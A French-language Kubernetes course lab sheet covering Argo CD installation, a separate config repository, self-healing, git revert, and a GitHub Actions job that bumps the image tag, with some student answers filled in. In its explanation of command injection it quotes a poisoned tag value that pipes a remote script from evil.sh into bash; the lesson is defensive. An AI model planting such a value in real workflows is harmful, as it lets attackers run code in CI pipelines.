# TP4 : GitOps avec Argo CD

**Durée : environ 3 h** (+ QCM) · Jour 4, après-midi

## Objectif

Déployer l'application avec le GitOps : on ne touche plus jamais au cluster à la main, on modifie un dépôt Git
et Argo CD applique le changement. À la fin, un simple `git tag` déploie une nouvelle version dans le cluster.

> 📸 Ce TP contient 9 captures pour le dossier (TP4-1 à TP4-10, la TP4-6 est remplacée par une observation écrite).

> **Vous avez déjà commencé la version précédente de ce TP ? Vous n'avez rien à refaire.**
> Les numéros de captures n'ont pas changé : gardez celles que vous avez déjà (y compris TP4-6, elle ne sera simplement plus demandée).
> Ce qui a changé : les commandes sont expliquées, la Partie 2 vous fait **cloner** `tasks-config` (nécessaire pour la Partie 3 :
> si vous aviez créé le dépôt uniquement sur le site GitHub, clonez-le maintenant, Partie 2 étape 2), `git revert` prend `--no-edit`,
> la Partie 4 fournit un squelette de job à compléter, et une section **« Si ça ne marche pas »** se trouve à la fin.

## Vocabulaire à connaître

| Mot | Ce que c'est |
|---|---|
| **Kubernetes** | Un logiciel qui fait tourner vos applications (conteneurs Docker) et les surveille : si l'une tombe, il la relance. |
| **Cluster** | L'ensemble des machines gérées par Kubernetes. Avec **kind**, on crée un mini-cluster dans Docker, sur votre propre PC. |
| **Pod** | La plus petite unité de Kubernetes : votre conteneur en train de tourner. |
| **Deployment** | La consigne « je veux *N* pods de cette image, et remplace-les s'ils tombent ». |
| **Namespace** | Un « dossier » de rangement dans le cluster, pour ne pas mélanger les applications. |
| **Manifeste** | Un fichier YAML qui décrit ce qu'on veut dans le cluster (le `deployment.yaml`, par exemple). |
| **Argo CD** | Un programme installé *dans* le cluster : il compare en permanence le dépôt Git et le cluster, et corrige le cluster pour qu'il corresponde à Git. |
| **Synced** | (Argo CD) Le cluster est **identique** à ce qu'il y a dans Git. L'inverse s'appelle `OutOfSync` : il y a une différence. |
| **Healthy** | (Argo CD) Ce qui est déployé **fonctionne** : pods démarrés et prêts. Les autres états : `Progressing` (démarrage en cours), `Degraded` (erreur), `Missing` (n'existe pas encore). |

> Une application peut être `Synced` mais pas `Healthy` (c'est bien le contenu de Git, mais les pods plantent), ou l'inverse.

### Avant de commencer

- [ ] Docker Desktop lancé, avec **au moins 4 Go de mémoire** (Settings → Resources)
- [ ] Votre image `ghcr.io/<compte>/tasks-api:0.1.0` existe et son package est **public**
- [ ] `kubectl version --client` et `kind version` répondent

> **Règle générale :** quand un texte contient `<votre-compte-github>`, remplacez tout, y compris les `< >`, par votre identifiant GitHub **en minuscules**.
> Les noms d'images Docker n'acceptent pas les majuscules : avec une majuscule, Kubernetes ne trouvera pas l'image.

---

## Partie 1 : Cluster et Argo CD (35 min)

Lancez les commandes **dans l'ordre**, une par une, et lisez ce qu'elles affichent.

**1. Créer le cluster**

```bash
kind create cluster --name gitops
```
Crée un mini-cluster Kubernetes dans Docker, nommé `gitops`. Cela prend 1 à 2 minutes.
Lancez-la **même si vous l'avez déjà fait hier** : si le cluster existe déjà, kind le dit (« already exist ») et c'est normal, vous continuez.

**2. Vérifier le cluster**

```bash
kubectl get nodes
```
`kubectl` est l'outil qui parle au cluster ; `get nodes` liste ses machines (« nœuds »).

> ✅ **Point de contrôle :** une ligne `gitops-control-plane` avec le statut `Ready`. Si vous voyez `NotReady`, attendez 30 secondes et relancez. Si vous voyez une erreur de connexion, Docker n'est pas démarré.

**3. Créer le namespace d'Argo CD**

```bash
kubectl create namespace argocd
```
Crée un « dossier » `argocd` dans le cluster. Si le message dit `AlreadyExists`, c'est normal, continuez.

**4. Installer Argo CD**

```bash
kubectl apply -n argocd --server-side --force-conflicts -f https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml
```
- `kubectl apply -f <fichier>` : « fais en sorte que le cluster corresponde à ce fichier ». Ici, le fichier est téléchargé depuis le projet Argo CD (c'est l'URL).
- `-n argocd` : dans le namespace `argocd`.
- `--server-side` : c'est le cluster lui-même qui applique le fichier. Obligatoire ici, car certains éléments d'Argo CD sont trop gros pour la méthode classique.
- `--force-conflicts` : si une installation précédente a laissé des traces en conflit, on les remplace au lieu de s'arrêter.

> ✅ **Point de contrôle :** une longue liste de lignes finissant par `serverside-applied`. C'est normal, il y en a plus de 50.

**5. Attendre qu'Argo CD démarre**

```bash
kubectl wait --for=condition=Ready pods --all -n argocd --field-selector=status.phase=Running --timeout=300s
```
« Attends que tous les pods du namespace `argocd` qui sont en cours d'exécution (`Running`) soient prêts, 300 secondes maximum. » Le morceau `--field-selector=status.phase=Running` écarte les pods `Completed` (voir ci-dessous) : sans lui, la commande les attendrait pour rien et finirait en `timed out`.

> ⏱️ Si vous voyez `error: timed out waiting for the condition` : votre machine est simplement lente, ce n'est pas grave.
> Relancez la même commande (sans danger), ou mettez `--timeout=600s`, ou regardez l'évolution avec `kubectl get pods -n argocd -w` jusqu'à ce que tous les pods soient `Running` et `1/1` (Ctrl + C pour quitter). Un pod `Completed` (`0/1`) est normal : c'est une petite tâche terminée, qui ne redeviendra jamais « prête ». C'est pour cela que la commande de l'étape 5 ne l'attend pas.

**6. Ouvrir l'interface web d'Argo CD**

```bash
kubectl port-forward svc/argocd-server -n argocd 8080:443
```
Argo CD est *dans* le cluster, donc inaccessible depuis votre navigateur. `port-forward` crée un « tunnel » : ce qui arrive sur le port **8080 de votre PC** est envoyé au port 443 d'Argo CD.
Cette commande **ne rend pas la main** : laissez ce terminal ouvert et **ouvrez-en un deuxième** pour la suite. `Ctrl + C` arrête le tunnel.

> Si vous voyez `address already in use` : le port 8080 est déjà pris par un autre programme. Choisissez-en un autre, par exemple `8082` ou `5430` :
> `kubectl port-forward svc/argocd-server -n argocd 5430:443`, puis ouvrez `https://localhost:5430`.
> (Le premier nombre est le port de **votre PC**, le second celui du cluster. Évitez `8081`, nous l'utiliserons plus loin.)

Allez sur https://localhost:8080 (ou votre port) et acceptez l'avertissement du certificat (c'est normal : le certificat est auto-signé).
Utilisateur : `admin`. Mot de passe : à récupérer avec la commande de votre système.

**7. Récupérer le mot de passe**

macOS / Linux :
```bash
kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath="{.data.password}" | base64 -d
```

Windows (PowerShell) :
```powershell
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath="{.data.password}")))
```

Ce que fait la commande macOS / Linux, de gauche à droite :
- `kubectl ... get secret argocd-initial-admin-secret` : lit le « secret » où Argo CD a rangé le mot de passe.
- `-o jsonpath="{.data.password}"` : n'affiche que le champ `password`.
- `|` (le **« pipe »**, clavier français : `Alt Gr + 6` sous Windows, `Option + Maj + L` sur Mac) : envoie le résultat de la commande de gauche à la commande de droite.
- `base64 -d` : le mot de passe est stocké **encodé** en base64 (ce n'est pas un chiffrement, juste un codage) ; `-d` le décode.

> ⚠️ Sur macOS / Linux, le mot de passe s'affiche **collé** au début de la ligne suivante (pas de retour à la ligne). Copiez uniquement les caractères du mot de passe.

> 📸 **TP4-1 :** `kubectl get nodes` (un nœud `Ready`).
> 📸 **TP4-2 :** `kubectl get pods -n argocd` (tous `Running`) et la page de connexion d'Argo CD.

**Questions :** Avec vos mots : c'est quoi un pod ? Un deployment ? Pourquoi un `namespace` ? (Aidez-vous du vocabulaire ci-dessus et de `kubectl get pods -n argocd`.)
le conteneur tourne dans un pod, le Deployment garantit que le bon nombre de pods tourne dans la bonne version, et le namespace range et isole le tout.

---

## Partie 2 : Le dépôt de configuration (35 min)

L'idée : le dépôt `tasks-api` contient **le code** de l'application ; le dépôt `tasks-config` contient **ce qu'on veut dans le cluster**. Argo CD ne surveillera que le second.

**1. Créer le dépôt sur GitHub**
Un **nouveau dépôt GitHub public** nommé `tasks-config`. Ne cochez **aucune** case d'initialisation (pas de README, pas de .gitignore) : le dépôt doit être vide.

**2. Le cloner sur votre PC**
Dans un terminal, placez-vous dans le dossier qui contient déjà votre projet `tasks-api` (pas *dans* `tasks-api`), puis :

```bash
git clone https://github.com/<votre-compte-github>/tasks-config.git
cd tasks-config
```
`git clone` télécharge le dépôt dans un nouveau dossier `tasks-config`. On le clone pour pouvoir y faire des `commit`, `push` et `git revert` dans la Partie 3.

**3. Y copier la configuration**
Le dossier `config-repo/` se trouve **dans votre projet `tasks-api`** : il contient un dossier `k8s/` et un `README.md`. Copiez ces deux éléments dans `tasks-config` (par l'explorateur de fichiers, ou avec la commande suivante si `tasks-api` et `tasks-config` sont côte à côte ; adaptez le nom si votre dossier s'appelle autrement) :

macOS / Linux :
```bash
cp -r ../tasks-api/config-repo/k8s .
cp ../tasks-api/config-repo/README.md .
```
Windows (PowerShell) :
```powershell
Copy-Item -Recurse ..\tasks-api\config-repo\k8s .
Copy-Item ..\tasks-api\config-repo\README.md .
```

> ✅ **Point de contrôle :** dans `tasks-config` vous avez un dossier `k8s/` (avec `deployment.yaml` à l'intérieur) et `README.md`.

**4. Indiquer votre image**
Ouvrez `k8s/deployment.yaml`, remplacez `<votre-compte-github>` par votre identifiant **en minuscules** (les noms d'images Docker refusent les majuscules).

> ✅ **Point de contrôle :** la ligne `image:` ressemble à `ghcr.io/marie-dupont/tasks-api:0.1.0`, sans `<` ni `>`.

**5. Envoyer sur GitHub**
```bash
git add .
git commit -m "Ajout de la configuration Kubernetes"
git push origin main
```
> ✅ Rechargez la page du dépôt sur GitHub : vous y voyez `k8s/` et `README.md`.

**6. Dire à Argo CD de surveiller ce dépôt**
Retournez dans votre projet **`tasks-api`**, ouvrez `argocd/application.yaml` et remplacez aussi `<votre-compte-github>`. Les commentaires du fichier expliquent chaque ligne : **lisez-les**, ils répondent à « d'où vient le namespace `tasks` ? ». Puis, **depuis la racine de `tasks-api`** :

```bash
kubectl apply -f argocd/application.yaml
kubectl get pods -n tasks -w     # Ctrl + C pour quitter
```
Pas besoin de commiter ce fichier : il est lu **une seule fois**, depuis votre disque, par `kubectl apply`. (Le commiter ne gêne pas, mais ne change rien.)

> ✅ **Point de contrôle :** `application.argoproj.io/tasks-api created` (ou `configured`), puis, en 1 à 2 minutes, deux pods qui passent de `ContainerCreating` à `Running` (`1/1`).
> Si un pod reste en `ImagePullBackOff` ou `Pending` : voir **« Si ça ne marche pas »** en fin de TP.

**7. Observer dans Argo CD**
Dans l'interface, l'application `tasks-api` doit devenir **Synced** et **Healthy** (jusqu'à 3 minutes, ou cliquez sur **Refresh**).

**8. Appeler l'API**
Dans un 2ᵉ terminal (le premier fait toujours tourner le tunnel d'Argo CD) :
```bash
kubectl port-forward svc/tasks-api -n tasks 8081:80
```
Puis, dans un 3ᵉ terminal : `curl http://localhost:8081/version` (Windows : `curl.exe http://localhost:8081/version`).

> 📸 **TP4-3 :** l'application dans Argo CD, état Synced et Healthy, avec ses 2 pods.
> 📸 **TP4-4 :** la réponse de `/version` obtenue dans le cluster.

**Question :** Pourquoi sépare-t-on le dépôt de l'application et le dépôt de configuration ? (Pensez à ce qui déclenche la CI et à qui a le droit de modifier quoi.)
Pour éviter qu'a chaque push la config se refasse on les séparent en deux

---

## Partie 3 : Le GitOps en action (25 min)

Ouvrez un terminal dans `tasks-config` (le dépôt cloné). Vous pouvez arrêter (`Ctrl + C`) le tunnel `tasks-api` de la Partie 2 : il ne sert plus ici. **Gardez celui d'Argo CD.**

**A. Changer par Git.** Dans `k8s/deployment.yaml`, passez `replicas: 2` à `replicas: 3`, puis :
```bash
git add k8s/deployment.yaml
git commit -m "Passe a 3 replicas"
git push origin main
```
Cliquez sur **Refresh** dans Argo CD (ou attendez environ 3 minutes : c'est le rythme auquel Argo CD relit Git) : un 3ᵉ pod apparaît.

> ✅ **Point de contrôle :** `kubectl get pods -n tasks` affiche 3 pods `Running`.

**B. Dérive.** Une « dérive » est un écart entre le cluster et Git, provoqué par une modification manuelle.

Dans `argocd/application.yaml`, la ligne `selfHeal: true` dit à Argo CD : « si quelqu'un modifie le cluster à la main, **remets-le comme dans Git** ». C'est l'« auto-guérison ».

1. Dans un nouveau terminal, lancez et laissez tourner : `kubectl get pods -n tasks -w` (`-w` = *watch* : les changements s'affichent en direct).
2. Dans un autre, faites la modification manuelle : `kubectl scale deployment tasks-api -n tasks --replicas=5`
3. Observez le premier terminal pendant 30 secondes, puis arrêtez-le (`Ctrl + C`).

> 📝 **Observation TP4-6 (réponse écrite, pas de capture) :** à un moment, avez-vous vu les **5 pods** ? Pendant combien de temps environ ? Que s'est-il passé ensuite ?
> Les deux réponses sont bonnes : si Argo CD a corrigé en quelques secondes, vous pouvez très bien n'en avoir vu que 4, ou jamais 5. Ce qui compte, c'est ce que **vous** avez vu.

**C. Retour arrière.** Dans `tasks-config` :
```bash
git log --oneline -3
```
Le commit du haut doit être « Passe a 3 replicas ». Puis :
```bash
git revert --no-edit HEAD
git push origin main
```
`git revert HEAD` crée un **nouveau commit** qui annule le dernier (l'historique n'est pas effacé). `--no-edit` évite l'ouverture d'un éditeur de texte pour le message. (Si vous vous retrouvez bloqué dans un éditeur : dans `vim`, tapez `:wq` puis Entrée ; dans `nano`, `Ctrl + X`.)
Refresh dans Argo CD : le nombre de pods revient à 2.

> ✅ **Point de contrôle :** `git log --oneline -2` montre un commit `Revert "Passe a 3 replicas"`, et Argo CD affiche 2 pods.

> 📸 **TP4-5 :** le commit sur `replicas: 3` et les 3 pods dans Argo CD.
> 📸 **TP4-7 :** l'historique des commits de `tasks-config` avec le `revert`, et le retour à 2 pods.

**Questions :** Que signifie `selfHeal` ? Pourquoi le retour arrière est-il simple en GitOps ?

---

## Partie 4 : La chaîne complète (60 min)

Objectif : un tag `v0.2.0` sur le dépôt applicatif doit aboutir à la nouvelle version dans le cluster, **sans aucune commande manuelle**.

Le chemin : `git tag` → pipeline (tests, image, production) → le pipeline modifie `tasks-config` → Argo CD voit le changement → nouveaux pods.

**1. Créer un jeton d'accès**
GitHub → Settings → Developer settings → **Fine-grained personal access tokens** → *Generate new token* :
- accès limité au **seul dépôt `tasks-config`**,
- permission **Contents : Read and write**,
- expiration : 7 jours suffisent.

Copiez le jeton **tout de suite** : GitHub ne l'affiche qu'une fois.

> **Pourquoi un jeton, alors que `tasks-config` est public ?** Public veut dire que tout le monde peut **lire** le dépôt, pas qu'on peut **y écrire**.
> Votre pipeline tourne dans `tasks-api` et reçoit automatiquement une clé temporaire qui ne marche **que pour `tasks-api`**.
> Pour qu'il puisse écrire (pousser un commit) dans un *autre* dépôt, vous lui donnez une clé spéciale : ce jeton. Il est volontairement limité à un dépôt et à une permission : s'il fuite, les dégâts restent minimes. C'est le principe du **moindre privilège**.

**2. Le ranger dans les secrets**
Dépôt **applicatif** (`tasks-api`) : Settings → Secrets and variables → Actions → *New repository secret*, nom `CONFIG_REPO_TOKEN`, collez le jeton.
Ne le collez **jamais** dans un fichier du dépôt : un secret GitHub est stocké chiffré et masqué dans les journaux.

> ✅ Le secret `CONFIG_REPO_TOKEN` apparaît dans la liste (sa valeur n'est plus lisible, c'est normal).

**3. Comprendre le script fourni**
Le dossier `scripts/` contient `set-image-tag.sh` : il remplace la version de l'image dans le manifeste. Vous n'avez rien à écrire. Lisez-le (`cat scripts/set-image-tag.sh`), il est court.
Il s'utilise ainsi : `bash scripts/set-image-tag.sh <fichier-manifeste> <version>`.

**4. Compléter le job `update-config`**
Dans le projet **`tasks-api`**, ouvrez `.github/workflows/docker.yml` et ajoutez ce job **juste après `deploy-production`**, avec la même indentation que lui (le nom `update-config:` doit commencer exactement sous le `d` de `deploy-production:`). En YAML, un espace de trop ou de moins change le sens. **Remplacez les `___`** (5 trous) :

```yaml
  update-config:
    needs: ___                          # TROU 1 : ce job démarre après quel job ?
    if: startsWith(github.ref, '___')   # TROU 2 : uniquement sur un tag : regardez la ligne `if` de deploy-production ; si elle est écrite autrement, recopiez-la telle quelle à la place de cette ligne
    runs-on: ubuntu-latest
    permissions:
      contents: read
    env:
      VERSION: ${{ github.ref_name }}   # le nom du tag, par exemple v0.2.0
    steps:
      - name: Récupérer le dépôt applicatif
        uses: actions/checkout@v6       # même version que vos autres jobs

      - name: Récupérer le dépôt de configuration
        uses: actions/checkout@v6
        with:
          repository: ___/tasks-config  # TROU 3 : votre compte GitHub (minuscules)
          token: ${{ secrets.CONFIG_REPO_TOKEN }}
          path: ___                     # TROU 4 : le dossier attendu par la commande suivante

      - name: Mettre à jour la version de l'image
        run: bash scripts/set-image-tag.sh config/k8s/deployment.yaml "${VERSION#v}"

      - name: Commiter et pousser dans tasks-config
        run: |
          cd config
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add ___                   # TROU 5 : le fichier modifié, chemin depuis la racine de tasks-config
          git commit -m "Déploiement de tasks-api ${VERSION#v}"
          git push
```

**Ce qu'il faut comprendre dans ce job :**

- **`${VERSION#v}` : le `v` du tag.** Le tag Git s'appelle `v0.2.0`, mais l'image Docker publiée au TP3 s'appelle `0.2.0` (**sans** `v`). Le manifeste doit contenir le nom exact de l'image : on veut donc `0.2.0`.
  `${VERSION#v}` signifie « la valeur de `VERSION`, privée de son `v` du début » : `v0.2.0` devient `0.2.0`.
  Vérifiez-le : GitHub → votre profil → *Packages* → `tasks-api` : les versions listées n'ont pas de `v`.
- **Pourquoi `VERSION` passe par `env` et jamais par `${{ … }}` dans la commande.** Avant même de lancer la commande, GitHub **remplace** `${{ … }}` par sa valeur, comme un copier-coller dans le script. Si cette valeur contient des caractères spéciaux (un nom de branche ou de tag piégé, par exemple `x"; curl evil.sh | bash; "`), ils sont alors **exécutés comme des commandes** : c'est une *injection de commande*. Avec `env`, la valeur arrive dans une variable, traitée comme du simple texte, jamais comme du code.
- **`token:` dans le 2ᵉ checkout.** C'est ce jeton qui donne le droit d'écrire dans `tasks-config` (voir l'encadré de l'étape 1). Le `git push` de la dernière étape réutilise automatiquement ce droit.
- **`needs` + `if`.** Le job attend `deploy-production` (donc votre approbation manuelle) et ne tourne que sur un tag, jamais sur un simple commit.

> ✅ **Point de contrôle :** aucun `___` ne reste dans le fichier, l'indentation est identique à celle des autres jobs, et GitHub n'affiche pas d'erreur de syntaxe rouge sur le fichier.

**5. Déployer**
Depuis le dossier **`tasks-api`**, poussez `docker.yml` comme vous l'avez fait au TP3 (via une branche et une pull request si votre branche `main` est protégée). Puis, toujours dans `tasks-api` et **à jour sur `main`** :
```bash
git checkout main
git pull
git tag v0.2.0
git push origin v0.2.0
```
Dans l'onglet *Actions*, suivez le run : approuvez la production (bouton *Review deployments*, comme au TP3), puis regardez `update-config` passer au vert, le commit automatique apparaître dans `tasks-config`, et Argo CD synchroniser.

> ⏱️ **Combien de temps ?** Comptez **5 à 10 minutes au maximum** entre l'approbation et les nouveaux pods : le pipeline prend quelques minutes, puis Argo CD relit Git toutes les 3 minutes (accélérez avec **Refresh**). Au-delà de 10 minutes, cherchez l'erreur dans la section « Si ça ne marche pas ».

> ℹ️ Le dépôt local `tasks-config` est maintenant **en retard** (le pipeline y a poussé un commit). Si vous y retouchez, faites d'abord `git pull`.

**6. Vérifier**
Les pods ont été remplacés : l'ancien tunnel est coupé (message `lost connection to pod`). Relancez-le, puis appelez l'API :
```bash
kubectl port-forward svc/tasks-api -n tasks 8081:80
```
`curl http://localhost:8081/version` (Windows : `curl.exe …`) doit répondre `0.2.0`.

> 📸 **TP4-8 :** le run complet avec tous les jobs au vert, `update-config` compris.
> 📸 **TP4-9 :** le commit automatique dans `tasks-config` et Argo CD synchronisé sur `0.2.0`.
> 📸 **TP4-10 :** `/version` qui répond `0.2.0`.

**Questions :** Résumez en 5 lignes le chemin d'un `git tag` jusqu'au pod. Qui pousse (push) et qui tire (pull) ? Quelle différence avec un déploiement CI/CD « classique » ?
La différence avec le déploiement classique : dans un déploiement classique, le robot entre lui-même dans le serveur pour installer la nouvelle version, ce qui demande de lui confier les clés. Ici, le robot ne touche jamais au serveur : il laisse un message, et le serveur s’occupe de tout. C’est plus sûr, et pour revenir en arrière il suffit d’annuler la dernière modification de la fiche.

---

## Si ça ne marche pas : comprendre une erreur

**Méthode en 3 réflexes** (dans cet ordre) :
1. **Lisez le message en entier**, surtout les dernières lignes : il dit souvent quoi faire.
2. `kubectl get pods -n tasks` : regardez la colonne **STATUS**.
3. Pour un pod en erreur : `kubectl describe pod <nom-du-pod> -n tasks` (regardez la section **Events**, tout en bas) et `kubectl logs <nom-du-pod> -n tasks` (ce que l'application a affiché).

| Ce que vous voyez | Ce que ça veut dire | Que faire |
|---|---|---|
| `ImagePullBackOff` / `ErrImagePull` | Kubernetes ne trouve pas ou ne peut pas télécharger l'image. | Vérifiez dans `deployment.yaml` : compte **en minuscules**, nom et version exacts. Vérifiez que le package GHCR est **public** (GitHub → Packages → `tasks-api` → *Package settings* → *Change visibility*). Sur un Mac Apple Silicon (M1, M2, M3…), `kubectl describe pod` peut afficher `no matching manifest for linux/arm64/v8` : l'image a été construite seulement pour les PC classiques ; demandez au formateur de la republier avec le workflow `docker.yml` du TP3. |
| `CrashLoopBackOff` | L'application démarre puis plante en boucle. | `kubectl logs <pod> -n tasks` : lisez l'erreur de l'application. |
| Pod `Pending` | Il n'y a pas de place pour le démarrer. | Docker Desktop : augmentez la mémoire (Settings → Resources) et relancez Docker. |
| Argo CD : `Unknown` ou `ComparisonError` | Argo CD n'arrive pas à lire le dépôt. | Cliquez sur l'application, lisez le message d'erreur : URL fausse (`repoURL` dans `application.yaml`), dépôt privé, ou `path: k8s` introuvable (le dossier doit être à la racine du dépôt). Si le message parle de `connection refused` vers GitHub alors que l'URL est bonne, redémarrez le composant qui lit Git : `kubectl rollout restart deploy/argocd-repo-server -n argocd`, attendez 1 minute, puis **Refresh**. |
| Argo CD : `OutOfSync` qui ne bouge pas | Il n'a pas encore relu Git. | Cliquez sur **Refresh**, ou attendez 3 minutes. |
| Argo CD : `Degraded` | Les ressources existent mais ne fonctionnent pas. | Même diagnostic que pour les pods (`describe`, `logs`). |
| `address already in use` | Le port est déjà utilisé. | Changez le premier nombre (`5430:443`) ou fermez l'ancien tunnel. |
| `Unable to connect to the server` / `connection refused` | `kubectl` ne trouve pas le cluster. | Docker Desktop est-il lancé ? `kind get clusters` doit afficher `gitops`. |
| `lost connection to pod` | Le pod a été remplacé : le tunnel pointait sur l'ancien. | `Ctrl + C`, puis relancez la commande `port-forward`. |
| `error: timed out waiting for the condition` | L'attente a été trop courte. | Relancez la commande, ou `--timeout=600s`. |
| `git push` : `rejected … non-fast-forward` (ou `fetch first`) | Le dépôt distant a un commit que vous n'avez pas. | `git pull --rebase origin main`, puis `git push origin main`. |
| Pipeline, étape `update-config` : `403` / `Permission denied` / `Resource not accessible` / `Bad credentials` | Le jeton ne donne pas le droit d'écrire (ou a été supprimé : `Bad credentials`). | Revérifiez : jeton limité à `tasks-config`, permission **Contents : Read and write**, non expiré, secret nommé exactement `CONFIG_REPO_TOKEN`. Si vous recréez le jeton, mettez à jour le secret, puis relancez le job en échec (*Re-run failed jobs*). |
| Pipeline : `nothing to commit` (l'étape `update-config` devient rouge) | Le manifeste contenait déjà cette version : il n'y a rien à enregistrer. | Normal si vous relancez le même tag : ce n'est pas une panne. Créez un nouveau tag (`v0.2.1`) pour refaire le parcours complet. |
| `tag already exists` | Ce tag a déjà été créé. | Prenez le suivant (`v0.2.1`) : `/version` répondra alors `0.2.1`. |
| Le job `update-config` n'apparaît pas dans le run | Mauvaise indentation, ou le `if` ne correspond pas à un tag. | Comparez avec `deploy-production` : mêmes espaces, même `if`. |

---

## QCM final (30 min)

Le formateur vous donne un lien : QCM individuel, sans documents. C'est la moitié de la note.

## Dossier à rendre

Complétez votre dossier (TP1 à TP4 + bilan) : à rendre le vendredi 6 novembre à 17 h. Voir `docs/DOSSIER.md`.

## Nettoyage (facultatif)

`kind delete cluster --name gitops`
